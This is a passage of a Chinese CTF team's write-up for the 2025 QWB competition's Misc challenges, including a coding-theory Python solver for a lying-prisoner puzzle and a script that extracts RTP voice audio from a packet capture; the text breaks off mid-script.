@@ -1,0 +1,3482 @@
+---
+title: 2025 QWB-S9 SU WriteUp
+tags: ["QWB"]
+date: 2025-10-21 22:41:45
+draft: true
+slug: "qwb-s9-su-wu"
+---
+
+本次强网杯我们 SU 从各方面原因考虑，十位师傅组成一队，名为“SehllWeDance”，取得了 19th 的成绩，感谢队里师傅们的辛苦付出，每个人都熬夜通宵干！特别是`@2hi5hu`师傅，一个人几乎AK misc 方向。同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+
+以下是我们 SU 本次 2025 强网杯的 WriteUp。
+
+<!--more-->
+
+# Misc
+
+## 签到
+
+直接复制flag提交
+
+## 问卷
+
+直接答就行了
+
+## Personal Vault
+
+一血，没想太多，直接拿lovelymem luxe搜了一波flag，直接非了
+
+![img](1.png)
+
+## The_Interrogation_Room
+
+叽里咕噜说的啥听不懂，大概就是要提问17轮，其中有两轮是说谎的，根据信息推出正确的数据，要连续猜对25轮，当时题解数已经多到可怕了，一怒之下问ai梭了
+
+![img](2.png)
+
+```Python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+solve_interrogation_coded.py
+Robust automated client that constructs a 17-query error-correcting measurement
+set (XOR-based), so that up to 2 erroneous answers can be corrected reliably.
+
+Usage: python3 solve_interrogation_coded.py
+"""
+import socket, hashlib, random, re, time, itertools
+from itertools import product
+
+HOST = "39.106.57.152"
+PORT = 22667
+TIMEOUT = 12
+
+ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+# ---------------- I/O helpers ----------------
+def recv_all(sock, timeout=0.5):
+    sock.settimeout(timeout)
+    out = b""
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            out += chunk
+            if len(chunk) < 4096:
+                break
+    except socket.timeout:
+        pass
+    except Exception:
+        pass
+    try:
+        return out.decode(errors='replace')
+    except:
+        return out.decode('utf-8','replace')
+
+def recv_until(sock, marker, timeout=8):
+    end = time.time() + timeout
+    data = ""
+    while time.time() < end:
+        data += recv_all(sock, timeout=0.2)
+        if marker in data:
+            return data
+    return data
+
+def send_line(sock, s):
+    if isinstance(s, str):
+        sock.sendall((s + "\n").encode())
+    else:
+        sock.sendall(s + b"\n")
+
+# ---------------- POW ----------------
+def parse_pow(text):
+    m = re.search(r"sha256\(\s*XXXX\s*\+\s*([^\)\s]+)\s*\)\s*==\s*([0-9a-fA-F]{64,})", text)
+    if not m:
+        return None, None
+    return m.group(1).strip().strip("{}"), m.group(2).strip()
+
+def brute_prefix(suffix, target_hex):
+    sfx = suffix.encode()
+    # randomized attempts first
+    for _ in range(200000):
+        cand = ''.join(random.choice(ALPHABET) for _ in range(4)).encode()
+        if hashlib.sha256(cand + sfx).hexdigest() == target_hex:
+            return cand.decode()
+    # deterministic fallback
+    for a in ALPHABET:
+        for b in ALPHABET:
+            for c in ALPHABET:
+                for d in ALPHABET:
+                    cand = (a+b+c+d).encode()
+                    if hashlib.sha256(cand + sfx).hexdigest() == target_hex:
+                        return cand.decode()
+    return None
+
+# ---------------- build XOR expression (white-list-safe) ----------------
+def fmt_token(tok):
+    # tokens like "( S0 == 1 )" already spacing-safe; we ensure spacing around parens and == later
+    return tok
+
+def xor2_expr(a_expr, b_expr):
+    # XOR(a,b) = (a and not b) or (not a and b)
+    # but 'not' isn't in whitelist; use (a==1 and b==0) or (a==0 and b==1)
+    return "( ( " + a_expr + " and " + "( " + b_expr + " ) == 0 ) or ( ( " + a_expr + " ) == 0 and " + b_expr + " ) )"
+
+def build_xor_expr(indices):
+    """
+    indices: list of bit indices [0..7] to XOR together
+    returns string expression using allowed tokens
+    implement by folding pairwise XOR
+    base var expression for bit i: ( S{i} == 1 )
+    For a single index, return "( S{i} == 1 )"
+    """
+    assert len(indices) >= 1
+    def var(i):
+        return f"( S{i} == 1 )"
+    exprs = [var(i) for i in indices]
+    # fold using xor2_expr
+    cur = exprs[0]
+    for e in exprs[1:]:
+        # xor2_expr expects boolean-like strings; but it uses "== 0" comparisons
+        # ensure inside expressions are parenthesized
+        cur = "( ( " + cur + " and ( " + e + " ) == 0 ) or ( ( " + cur + " ) == 0 and " + e + " ) )"
+    # clean up double spaces
+    return re.sub(r"\s+", " ", cur).strip()
+
+# ---------------- search for good generator matrix G (8 x 17) ----------------
+def weight(v):
+    return sum(1 for x in v if x)
+
+def code_min_distance(G_cols):
+    # G_cols: list of 17 column vectors each length 8 bits (0/1)
+    # compute all codewords s*G (mod 2) for s in 1..255 and return minimum weight
+    minw = None
+    # For speed, precompute columns as ints bitpacked
+    col_ints = []
+    for col in G_cols:
+        val = 0
+        for i,b in enumerate(col):
+            if b:
+                val |= (1<<i)
+        col_ints.append(val)
+    # enumerate nonzero s in 1..255
+    for s in range(1, 1<<8):
+        # compute codeword bits across 17 columns: bit j = parity(popcount(col_ints[j] & s))
+        cw_weight = 0
+        for c in col_ints:
+            bits = bin(c & s).count("1")
+            b = bits & 1
+            cw_weight += b
+            # early cutoff
+            if minw is not None and cw_weight >= minw:
+                break
+        if cw_weight == 0:
+            continue
+        if minw is None or cw_weight < minw:
+            minw = cw_weight
+            if minw == 1:
+                return 1
+    return minw if minw is not None else 0
+
+def find_good_G(max_tries=20000):
+    # return G_cols: list of 17 columns each a list of 8 bits (0/1), with min distance >=5
+    tries = 0
+    while tries < max_tries:
+        tries += 1
+        # generate random full-rank generator matrix: 8x17 (we create 17 columns length 8)
+        # ensure rank 8 by ensuring first 8 columns form invertible matrix - simpler: construct by starting with identity cols then add random
+        cols = []
+        # put identity columns first
+        for i in range(8):
+            col = [0]*8
+            col[i] = 1
+            cols.append(col)
+        # remaining 9 random nonzero columns
+        for _ in range(9):
+            col = [random.choice([0,1]) for _ in range(8)]
+            # avoid all zero column
+            if sum(col) == 0:
+                col[random.randrange(8)] = 1
+            cols.append(col)
+        # compute min distance
+        dmin = code_min_distance(cols)
+        if dmin >= 5:
+            print(f"[+] Found G with dmin={dmin} after {tries} tries")
+            return cols
+        # else shuffle and try small mutation occasionally
+        if tries % 500 == 0:
+            pass
+    raise RuntimeError("failed to find good G in given tries")
+
+# ---------------- build queries from G ----------------
+def build_queries_from_G(G_cols):
+    # For each column (list of 8 bits) produce XOR expression of indices where bit==1
+    queries = []
+    for col in G_cols:
+        inds = [i for i,b in enumerate(col) if b]
+        if not inds:
+            # column zero shouldn't happen; use constant 0 expression
+            q = "( 0 == 1 )"
+        elif len(inds) == 1:
+            q = f"( S{inds[0]} == 1 )"
+        else:
+            q = build_xor_expr(inds)
+        # normalize spaces to avoid smirk
+        q = re.sub(r"\s+", " ", q).strip()
+        queries.append(q)
+    return queries
+
+# ---------------- helper to encode secret by G ----------------
+def encode_by_G(s_tuple, G_cols):
+    # s_tuple length 8 of 0/1 ints
+    code = []
+    for col in G_cols:
+        # parity of dot product s . col
+        v = sum(s_tuple[i] & col[i] for i in range(8)) & 1
+        code.append(bool(v))
+    return code
+
+# ---------------- main interaction using coded queries ----------------
+def run_coded(attempts_find_G=5000):
+    random.seed()  # unpredictable per run
+    print("[*] Searching for good generator matrix G (this runs locally)...")
+    G_cols = find_good_G(max_tries=attempts_find_G)
+    queries = build_queries_from_G(G_cols)
+    print("[*] Using generated queries (17):")
+    for i,q in enumerate(queries,1):
+        print(f"{i:02d}: {q}")
+
+    # now network interaction (POW -> send queries -> decode -> submit) - follows same interaction style
+    sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
+    sock.settimeout(1.0)
+    try:
+        banner = recv_until(sock, "Give me XXXX:", timeout=12)
+        if "sha256" in banner:
+            suffix, hexd = parse_pow(banner)
+            if not suffix or not hexd:
+                banner += recv_all(sock, timeout=0.5)
+                suffix, hexd = parse_pow(banner)
+            if not suffix or not hexd:
+                print("[-] cannot parse POW")
+                return False
+            if "Give me" not in banner:
+                banner += recv_until(sock, "Give me XXXX:", timeout=4)
+            print("[*] POW suffix:", suffix, "target:", hexd)
+            prefix = brute_prefix(suffix, hexd)
+            if not prefix:
+                print("[-] POW failed")
+                return False
+            print("[+] POW solved:", prefix)
+            send_line(sock, prefix)
+        intro = recv_until(sock, "Ask your question:", timeout=12)
+        print(intro.strip())
+        _ = recv_all(sock, timeout=0.1)
+
+        rounds = 0
+        while True:
+            rounds += 1
+            print(f"[*] Round {rounds}")
+            answers = []
+            # send our designed queries sequentially
+            for i,q in enumerate(queries, start=1):
+                print(f"[>] Q{i:02d}: {q}")
+                send_line(sock, q)
+                resp = recv_until(sock, "Prisoner's response:", timeout=8)
+                resp += recv_all(sock, timeout=0.25)
+                print(resp.strip())
+                if "smirks" in resp or "refuse to answer" in resp:
+                    print("[-] server refused phrasing. aborting")
+                    return False
+                tail = resp.split("Prisoner's response:",1)[-1]
+                # parse boolean
+                if "True" in tail and "False" not in tail:
+                    val = True
+                elif "False" in tail and "True" not in tail:
+                    val = False
+                elif "True" in tail:
+                    val = True
+                elif "False" in tail:
+                    val = False
+                else:
+                    val = False
+                answers.append(bool(val))
+                time.sleep(0.01)
+
+            # decode: find s in 256 such that Hamming distance between encode_by_G(s) and answers <= 2
+            best = None
+            best_hd = 999
+            cands = []
+            for s in product([0,1], repeat=8):
+                code = encode_by_G(s, G_cols)
+                hd = sum(int(code[i]) != int(answers[i]) for i in range(17))
+                if hd < best_hd:
+                    best_hd = hd
+                    cands = [s]
+                elif hd == best_hd:
+                    cands.append(s)
+            print(f"[*] best_hd={best_hd} candidate_count={len(cands)}")
+            if best_hd <= 2 and len(cands) >= 1:
+                # pick unique if single, else majority among candidates
+                if len(cands) == 1:
+                    guess = cands[0]
+                else:
+                    # majority vote across candidate bits
+                    counts = [0]*8
+                    for c in cands:
+                        for k,b in enumerate(c):
+                            counts[k] += b
+                    guess = tuple(1 if counts[k]*2 >= len(cands) else 0 for k in range(8))
+            else:
+                # fallback: try brute-force search flipping up to 2 bits in answers (shouldn't be necessary)
+                found = False
+                for flip_idxs in itertools.combinations(range(17), 0 + 1 + 2):
+                    # try flipping these and see if simple decode by taking first 8 entries yields consistent s
+                    alt = answers[:]
+                    for fi in flip_idxs:
+                        alt[fi] = not alt[fi]
+                    # derive candidate s from first 8 alt bits by decoding linear system? but we used generator form: columns include identity first, so first 8 columns were identity in our G construction -> we can map s directly
+                    # our find_good_G constructed first 8 columns as identity, so alt[0..7] directly are s bits
+                    cand_s = tuple(1 if alt[k] else 0 for k in range(8))
+                    code = encode_by_G(cand_s, G_cols)
+                    if all(bool(code[i]) == bool(alt[i]) for i in range(17)):
+                        guess = cand_s
+                        found = True
+                        break
+                if not found:
+                    # last fallback: choose minimal hd candidate
+                    guess = cands[0] if cands else tuple(0 for _ in range(8))
+            print("[*] submit guess:", guess)
+            send_line(sock, " ".join(str(int(x)) for x in guess))
+
+            out = recv_until(sock, "", timeout=2)
+            out += recv_all(sock, timeout=0.6)
+            print(out.strip())
+            if "confesses" in out or "flag" in out.lower() or "you win" in out.lower():
+                print("[+] success final output:")
+                print(out)
+                return True
+            if "fell for my deception" in out or "disciplinary action" in out:
+                print("[-] failed this round")
+                return False
+            time.sleep(0.1)
+    except Exception as e:
+        print("Exception:", e)
+        try: sock.close()
+        except: pass
+        return False
+    finally:
+        try: sock.close()
+        except: pass
+
+if __name__ == "__main__":
+    random.seed()
+    try:
+        ok = run_coded(attempts_find_G=8000)
+        if not ok:
+            print("[-] finished without success")
+    except Exception as e:
+        print("Exception outer:", e)
+```
+
+非常稳定，我发现让ai解题的时候让他去找巧妙的解法很容易出
+
+![img](3.png)
+
+## 谍影重重 6.0
+
+流量分析+妙妙历史猜谜（靠北）
+
+打开题目是一个700多m的流量包，要吓尿了
+
+进去看到全是udp流量，前期绕了很多圈子，特别是看到了个manolito协议，后面反应过来是ws自己误识别的
+
+![img](4.png)
+
+实际上这个udp流量就是rtp数据（看他的数据格式跟之前wm那个voice hacker的流量数据简直一模一样），所以要将他们的音频提取出来，但是简单过了一下发现有1300个端口，每个端口对应一条语音，而且流量包太大了，全部用ws根本不现实，所以要用脚本，之前做voice_hacker有过脚本，在那基础上让ai优化升级了一下
+
+主要调整点在于原音频声音很小，而且有很多空白的地方，所以对提取的音频音量加大了，而且还去掉了空白的部分
+
+然后呢实际上1300个端口，每个端口都有2段数据，就是两段不同的音频，写脚本提取的时候要将重复的区分开，我让ai把他们放在了两个文件夹，然后将同一个目录中的音频按端口顺序合并为一个音频
+
+```Python
+# -*- coding: utf-8 -*-
+# extract_pcmu.py
+# 从经典PCAP(小端)中提取 RTP(PCMU, PT=0)：
+# - 正常音频：丢弃重复包（与原逻辑一致），丢包静音补洞 -> 放大音量 -> 去静音 -> 导出单条 -> 合成总音频
+# - 重复包音频：不丢弃重复包，仅把“重复包”按同样逻辑单独拼接为重复音轨 -> 放大音量 -> 去静音 -> 导出单条 -> 合成总音频
+# - 生成“非RTP/非PCMU”排查报告 TXT
+
+import os, io, struct, wave, datetime
+import numpy as np
+from collections import Counter, defaultdict
+
+# ========= 配置 =========
+PCAP_PATH = 'Data.pcap'     # 你的 pcap 文件 (经典PCAP小端)
+OUT_DIR   = r"output4"      # 正常音频输出目录
+DUP_DIR   = r"output4_dups" # 重复包音频输出目录
+
+# 合成总音频
+COMBINED_MAIN = "combined_by_ports.wav"
+COMBINED_DUP  = "combined_by_ports_dups.wav"
+GAP_SECONDS   = 2.0          # 合成段间静音（秒）
+SAMPLE_RATE   = 8000         # 统一 8kHz, mono, 16-bit
+
+# 音量放大参数
+USE_TARGET_PEAK = True       # True: 峰值规整化；False: 固定 dB 增益
+TARGET_PEAK     = 0.98       # 目标峰值（相对 32767），0.98 ≈ -0.18 dBFS
+FIXED_GAIN_DB   = 6.0        # 若不用目标峰值，则使用固定增益（dB）
+CLIP_PROTECT    = 0.999      # 额外防削波系数
+
+# 静音剔除（VAD）参数 —— 尽量不影响有声段
+FRAME_MS = 20                  # 帧长（毫秒）
+HOP_MS   = 10                  # 帧移（毫秒）
+SILENCE_THRESHOLD_DBFS = -35.0 # 静音阈值（dBFS）
+HYSTERESIS_DB = 3.0            # 滞后带（进入/离开语音的门限差）
+MIN_VOICE_MS = 60              # 最短保留语音段（毫秒）
+MERGE_GAP_MS = 50              # 两语音段间隙小于该值则合并（毫秒）
+LEAD_PAD_MS  = 20              # 每段语音前保留的缓冲（毫秒）
+TAIL_PAD_MS  = 40              # 每段语音后保留的缓冲（毫秒）
+
+# 丢包/重复判断参数
+MAX_GAP_PACKETS   = 1000       # 小于该缺口视作丢包并静音补洞
+FALLBACK_PL_SIZE  = 160        # 兜底负载长度（20ms @ 8kHz）
+REPORT_NAME       = "non_pcmu_report.txt"
+# ========================
+
+os.makedirs(OUT_DIR, exist_ok=True)
+os.makedirs(DUP_DIR, exist_ok=True)
+REPORT_PATH = os.path.join(OUT_DIR, REPORT_NAME)
+
+# --------------- 基础解析 ---------------
+def read_pcap_bytes():
+    if PCAP_PATH and os.path.exists(PCAP_PATH):
+        with open(PCAP_PATH, "rb") as f:
+            return f.read()
+    raise FileNotFoundError(f"找不到 PCAP 路径：{PCAP_PATH}")
+
+def parse_pcap_le(buf: bytes):
+    # PCAP 全局头 24 字节，小端魔数 0xD4C3B2A1
+    if len(buf) < 24 or buf[0:4] != b"\xD4\xC3\xB2\xA1":
+        raise ValueError("不是经典PCAP(小端)；请用 Wireshark -> Save As -> pcap(libpcap) 转存再试")
+    off = 24
+    while off + 16 <= len(buf):
+        ts_sec, ts_usec, incl_len, orig_len = struct.unpack("<IIII", buf[off:off+16])
+        off += 16
+        pkt = buf[off:off+incl_len]
+        off += incl_len
+        yield pkt
+
+def parse_eth(pkt: bytes):
+    if len(pkt) < 14: return None
+    dst, src, et = struct.unpack("!6s6sH", pkt[:14])
+    return et, pkt[14:]
+
+def parse_ipv4(payload: bytes):
+    if len(payload) < 20: return None
+    vihl = payload[0]
+    version = vihl >> 4
+    ihl = (vihl & 0x0F) * 4
+    if version != 4 or len(payload) < ihl: return None
+    total_length = struct.unpack("!H", payload[2:4])[0]
+    proto = payload[9]
+    return proto, payload[ihl:total_length]
+
+def parse_udp(seg: bytes):
+    if len(seg) < 8: return None
+    srcp, dstp, length, checksum = struct.unpack("!HHHH", seg[:8])
+    if length < 8 or length > len(seg): return None
+    return srcp, dstp, seg[8:length]
+
+def parse_rtp(payload: bytes):
+    # RTP v2 最小 12 字节
+    if len(payload) < 12: return None
+    if (payload[0] & 0xC0) != 0x80: return None  # Version=2
+    cc = payload[0] & 0x0F
+    pt = payload[1] & 0x7F
+    seq = struct.unpack("!H", payload[2:4])[0]
+    ts = struct.unpack("!I", payload[4:8])[0]
+    ssrc = struct.unpack("!I", payload[8:12])[0]
+    hdr_len = 12 + cc * 4
+    # 头扩展
+    if payload[0] & 0x10:
+        if len(payload) < hdr_len + 4: return None
+        ext_len = struct.unpack("!H", payload[hdr_len+2:hdr_len+4])[0] * 4
+        hdr_len += 4 + ext_len
+    if len(payload) < hdr_len: return None
+    return {"pt": pt, "seq": seq, "ts": ts, "ssrc": ssrc, "payload": payload[hdr_len:]}
+
+# --------------- G.711 PCMU 解码 ---------------
+def mulaw_decode_table():
+    lut = np.zeros(256, dtype=np.int16)
+    for i in range(256):
+        b = i ^ 0xFF  # PCMU 8bit 为反码
+        sign = b & 0x80
+        exponent = (b >> 4) & 0x07
+        mantissa = b & 0x0F
+        sample = (((mantissa << 3) | 132) << exponent) - 132  # 132 = 0x84
+        if sign:
+            sample = -sample
+        lut[i] = np.int16(sample)
+    return lut
+
+LUT = mulaw_decode_table()
+PCMU_SILENCE_BYTE = b'\xFF'  # μ-law 静音（解码约为 0）
+
+def decode_mulaw(data: bytes) -> np.ndarray:
+    u = np.frombuffer(data, dtype=np.uint8)
+    return LUT[u]
+
+# --------------- 音频处理 ---------------
+def apply_gain(pcm: np.ndarray) -> np.ndarray:
+    """峰值规整化/固定增益 + 防削波"""
+    if pcm.size == 0:
+        return pcm
+    pcm_f = pcm.astype(np.float32)
+    if USE_TARGET_PEAK:
+        peak = float(np.max(np.abs(pcm_f)))
+        if peak <= 0.0:
+            return pcm
+        target_amp = 32767.0 * TARGET_PEAK * CLIP_PROTECT
+        gain = target_amp / peak
+    else:
+        gain = 10.0 ** (FIXED_GAIN_DB / 20.0)
+    out = pcm_f * gain
+    out = np.clip(out, -32767.0, 32767.0)
+    return out.astype(np.int16)
+
+def _rms_dbfs(x: np.ndarray) -> float:
+    if x.size == 0: return -120.0
+    x_f = x.astype(np.float32) / 32768.0
+    rms = np.sqrt(np.mean(x_f * x_f) + 1e-12)
+    return 20.0 * np.log10(rms + 1e-12)
+
+def remove_silence(pcm: np.ndarray, sr: int = SAMPLE_RATE) -> np.ndarray:
+    """能量门限 VAD + 滞后 + 前后包络"""
+    if pcm.size == 0:
+        return pcm
+    frame_len = max(1, int(sr * FRAME_MS / 1000.0))
+    hop_len   = max(1, int(sr * HOP_MS   / 1000.0))
+
+    frames_db = []
+    i = 0
+    while i < len(pcm):
+        seg = pcm[i:i+frame_len]
+        frames_db.append(_rms_dbfs(seg))
+        i += hop_len
+    frames_db = np.asarray(frames_db, dtype=np.float32)
+
+    thr_on  = SILENCE_THRESHOLD_DBFS + HYSTERESIS_DB
+    thr_off = SILENCE_THRESHOLD_DBFS
+
+    voiced = np.zeros_like(frames_db, dtype=bool)
+    state = False
+    for k, db in enumerate(frames_db):
+        if not state:
+            if db >= thr_on: state = True
+        else:
+            if db < thr_off: state = False
+        voiced[k] = state
+
+    # 取语音区段
+    intervals, n, k = [], len(voiced), 0
+    while k < n:
+        if voiced[k]:
+            j = k + 1
+            while j < n and voiced[j]: j += 1
+            start = k * hop_len
+            end   = min(len(pcm), (j - 1) * hop_len + frame_len)
+            intervals.append([start, end])
+            k = j
+        else:
+            k += 1
+    if not intervals:
+        return np.array([], dtype=np.int16)
+
+    # 合并/最短/前后包络
+    def ms2samp(ms): return int(sr * ms / 1000.0)
+    min_len  = ms2samp(MIN_VOICE_MS)
+    mergegap = ms2samp(MERGE_GAP_MS)
+    lead     = ms2samp(LEAD_PAD_MS)
+    tail     = ms2samp(TAIL_PAD_MS)
+
+    merged = []
+    cur_s, cur_e = intervals[0]
+    for s, e in intervals[1:]:
+        if s - cur_e <= mergegap:
+            cur_e = max(cur_e, e)
+        else:
+            if cur_e - cur_s >= min_len:
+                merged.append([cur_s, cur_e])
+            cur_s, cur_e = s, e
+    if cur_e - cur_s >= min_len:
+        merged.append([cur_s, cur_e])
+    if not merged:
+        return np.array([], dtype=np.int16)
+
+    padded = []
+    for s, e in merged:
+        s = max(0, s - lead); e = min(len(pcm), e + tail)
+        if e > s: padded.append([s, e])
+
+    final_intervals = []
+    cur_s, cur_e = padded[0]
+    for s, e in padded[1:]:
+        if s <= cur_e:
+            cur_e = max(cur_e, e)
+        else:
+            final_intervals.append([cur_s, cur_e]); cur_s, cur_e = s, e
+    final_intervals.append([cur_s, cur_e])
+
+    parts = [pcm[s:e] for s, e in final_intervals]
+    return np.concatenate(parts) if parts else np.array([], dtype=np.int16)
+
+def save_wav(path, pcm, rate=SAMPLE_RATE):
+    with wave.open(path, "wb") as wf:
+        wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(rate)
+        wf.writeframes(pcm.tobytes())
+
+# --------------- 报告 ---------------
+def write_report(report_lines):
+    with open(REPORT_PATH, "w", encoding="utf-8") as f:
+        f.write("\n".join(report_lines))
+
+# --------------- 主流程 ---------------
+def main():
+    # 报告统计
+    non_ipv4_counts = Counter()
+    non_udp_counts  = Counter()
+    udp_non_rtp     = Counter()      # (srcp,dstp)
+    rtp_non_pcmu    = Counter()      # (srcp,dstp,ssrc,pt)
+    examples_udp_non_rtp = {}
+    total_packets = total_ipv4 = total_udp = total_rtp = total_rtp_pcmu = 0
+
+    raw = read_pcap_bytes()
+    streams = {}  # key=(srcp,dstp,ssrc) -> [rtp packets]
+
+    # 逐包解析 + 统计
+    for pkt in parse_pcap_le(raw):
+        total_packets += 1
+        eth = parse_eth(pkt)
+        if not eth: continue
+        etype, l3 = eth
+        if etype != 0x0800:
+            non_ipv4_counts[hex(etype)] += 1
+            continue
+        total_ipv4 += 1
+
+        ip = parse_ipv4(l3)
+        if not ip: continue
+        proto, ip_payload = ip
+        if proto != 17:
+            non_udp_counts[str(proto)] += 1
+            continue
+        total_udp += 1
+
+        udp = parse_udp(ip_payload)
+        if not udp: continue
+        srcp, dstp, udp_pl = udp
+
+        rtp = parse_rtp(udp_pl)
+        if not rtp:
+            key = (srcp, dstp)
+            udp_non_rtp[key] += 1
+            if key not in examples_udp_non_rtp:
+                prefix = udp_pl[:16] if udp_pl else b""
+                examples_udp_non_rtp[key] = prefix.hex(" ")
+            continue
+
+        total_rtp += 1
+        if rtp["pt"] != 0:  # 非 PCMU
+            key = (srcp, dstp, rtp["ssrc"], rtp["pt"])
+            rtp_non_pcmu[key] += 1
+            continue
+
+        total_rtp_pcmu += 1
+        key = (srcp, dstp, rtp["ssrc"])
+        streams.setdefault(key, []).append(rtp)
+
+    if not streams:
+        print("[!] 没抓到 PT=0(PCMU) 的 RTP。")
+
+    # ======== 正常/重复 两路音频构建 ========
+    out_files_main, out_files_dup = [], []
+    per_stream_main, per_stream_dup = [], []  # [(key, pcm, path)]
+
+    for (srcp, dstp, ssrc), pkts in streams.items():
+        if not pkts: continue
+        pkts.sort(key=lambda r: (r["ts"], r["seq"]))
+
+        # 统计常见负载长度
+        try:
+            size_counts = Counter(len(r["payload"]) for r in pkts)
+            default_pl_size = size_counts.most_common(1)[0][0]
+            if default_pl_size <= 0:
+                default_pl_size = FALLBACK_PL_SIZE
+        except Exception:
+            default_pl_size = FALLBACK_PL_SIZE
+
+        print(f"\n[+] 流 {srcp}->{dstp} (SSRC={ssrc}) 包数 {len(pkts)}，常见负载 {default_pl_size}B")
+
+        # 主音轨（丢弃重复包）
+        main_buf = io.BytesIO(); last_seq_main = None
+        # 重复音轨（仅由重复包构成，不丢弃重复）
+        dup_buf  = io.BytesIO();  last_seq_dup  = None
+
+        for r in pkts:
+            seq = r["seq"]; payload = r["payload"]
+
+            # ---------- 主音轨：保持原逻辑（丢弃重复包） ----------
+            if last_seq_main is None:
+                last_seq_main = seq
+                main_buf.write(payload)
+            else:
+                if seq == last_seq_main:
+                    # 重复包：主音轨丢弃
+                    pass
+                else:
+                    exp = (last_seq_main + 1) & 0xFFFF
+                    if seq == exp:
+                        main_buf.write(payload)
+                        last_seq_main = seq
+                    else:
+                        gap = (seq - exp + 65536) % 65536
+                        if gap < MAX_GAP_PACKETS:
+                            main_buf.write(PCMU_SILENCE_BYTE * default_pl_size * gap)
+                            main_buf.write(payload)
+                            last_seq_main = seq
+                        else:
+                            # 大跳变：直接衔接
+                            main_buf.write(payload)
+                            last_seq_main = seq
+
+            # ---------- 重复音轨：只收集“重复包内容” ----------
+            # 规则：当检测到 seq 与“主音轨 last_seq_main 之前值”相同，说明这是重复包；
+            # 但为避免主/重复交叉状态的问题，我们基于当前包与“上一主包序号”的相等性来定义“重复”：
+            # 如果与上一主包序号相等（即刚才进入主逻辑时被视作重复），则纳入重复音轨。
+            # 为实现这一点，我们在进入本循环顶部就先保存一下主轨 last_seq_main_before。
+            # 简化处理：当主逻辑认定此包为重复（seq == old_last_main），我们就把它写入 dup_buf。
+            # 这里通过再次判断实现：
+            # （注意：主轨部分已经把 last_seq_main 更新/保持住了）
+        # 第二轮再走一遍，标注重复（避免在一次循环里被主轨状态更新影响判定）
+        last_seq_main = None
+        for r in pkts:
+            seq = r["seq"]; payload = r["payload"]
+            if last_seq_main is None:
+                last_seq_main = seq
+                continue
+            if seq == last_seq_main:
+                # 命中“重复包” -> 写入重复音轨，并做简单的缺口补偿（相对 dup 序列）
+                if last_seq_dup is None:
+                    last_seq_dup = seq
+                    dup_buf.write(payload)
+                else:
+                    # 处理重复音轨的“序列缺口”以保证播放连贯（可选）
+                    exp_dup = (last_seq_dup + 1) & 0xFFFF
+                    if seq == exp_dup:
+                        dup_buf.write(payload)
+                        last_seq_dup = seq
+                    elif seq == last_seq_dup:
+                        # 同一序列的多次重复：直接追加
+                        dup_buf.write(payload)
+                        # last_seq_dup 不变也行；为稳定可设为相同值
+                        last_seq_dup = seq
+                    else:
+                        gap_dup = (seq - exp_dup + 65536) % 65536
+                        if gap_dup < MAX_GAP_PACKETS:
+                            dup_buf.write(PCMU_SILENCE_BYTE * default_pl_size * gap_dup)
+                            dup_buf.write(payload)
+                            last_seq_dup = seq
+                        else:
+                            dup_buf.write(payload)
+                            last_seq_dup = seq
+            else:
+                last_seq_main = seq  # 推进主轨参考序号
+
+        # --- 解码 & 处理：主音轨 ---
+        payload_main = main_buf.getvalue()
+        if payload_main:
+            pcm_main = decode_mulaw(payload_main)
+            pcm_main = apply_gain(pcm_main)
+            pcm_main = remove_silence(pcm_main, sr=SAMPLE_RATE)
+        else:
+            pcm_main = np.array([], dtype=np.int16)
+
+        wav_main = os.path.join(OUT_DIR, f"rtp_{srcp}_{dstp}_{ssrc}.wav")
+        save_wav(wav_main, pcm_main, SAMPLE_RATE)
+        out_files_main.append(wav_main)
+        per_stream_main.append(((srcp, dstp, ssrc), pcm_main, wav_main))
+        print(f"  [+] 主轨导出：{wav_main}（{len(pcm_main)/SAMPLE_RATE:.2f}s）")
+
+        # --- 解码 & 处理：重复音轨 ---
+        payload_dup = dup_buf.getvalue()
+        if payload_dup:
+            pcm_dup = decode_mulaw(payload_dup)
+            pcm_dup = apply_gain(pcm_dup)
+            pcm_dup = remove_silence(pcm_dup, sr=SAMPLE_RATE)
+        else:
+            pcm_dup = np.array([], dtype=np.int16)
+
+        wav_dup = os.path.join(DUP_DIR, f"rtp_dup_{srcp}_{dstp}_{ssrc}.wav")
+        save_wav(wav_dup, pcm_dup, SAMPLE_RATE)
+        out_files_dup.append(wav_dup)
+        per_stream_dup.append(((srcp, dstp, ssrc), pcm_dup, wav_dup))
+        print(f"  [=] 重复轨导出：{wav_dup}（{len(pcm_dup)/SAMPLE_RATE:.2f}s）")
+
+    print(f"\n完成：主轨 {len(out_files_main)} 条，重复轨 {len(out_files_dup)} 条。")
+
+    # ======== 合成总音频（主轨） ========
+    if per_stream_main:
+        per_stream_main.sort(key=lambda item: (item[0][0], item[0][1], item[0][2]))
+        gap = np.zeros(int(SAMPLE_RATE * GAP_SECONDS), dtype=np.int16)
+        parts, names = [], []
+        for (srcp, dstp, ssrc), pcm, path in per_stream_main:
+            if pcm.size == 0: continue
+            parts.append(pcm); names.append(os.path.basename(path)); parts.append(gap)
+        if parts and parts[-1].size == gap.size:
+            parts = parts[:-1]
+        combined = np.concatenate(parts) if parts else np.array([], dtype=np.int16)
+        comb_path = os.path.join(OUT_DIR, COMBINED_MAIN)
+        save_wav(comb_path, combined, SAMPLE_RATE)
+        print(f"[主轨合成] {comb_path}  ({len(combined)/SAMPLE_RATE:.2f}s)")
+        if names:
+            print("  顺序："); [print(f"   - {n}") for n in names]
+    else:
+        print("[主轨合成] 无可用音频，跳过。")
+
+    # ======== 合成总音频（重复轨） ========
+    if per_stream_dup:
+        per_stream_dup.sort(key=lambda item: (item[0][0], item[0][1], item[0][2]))
+        gap = np.zeros(int(SAMPLE_RATE * GAP_SECONDS), dtype=np.int16)
+        parts, names = [], []
+        for (srcp, dstp, ssrc), pcm, path in per_stream_dup:
+            if pcm.size == 0: continue
+            parts.append(pcm); names.append(os.path.basename(path)); parts.append(gap)
+        if parts and parts[-1].size == gap.size:
+            parts = parts[:-1]
+        combined = np.concatenate(parts) if parts else np.array([], dtype=np.int16)
+        comb_path = os.path.join(DUP_DIR, COMBINED_DUP)
+        save_wav(comb_path, combined, SAMPLE_RATE)
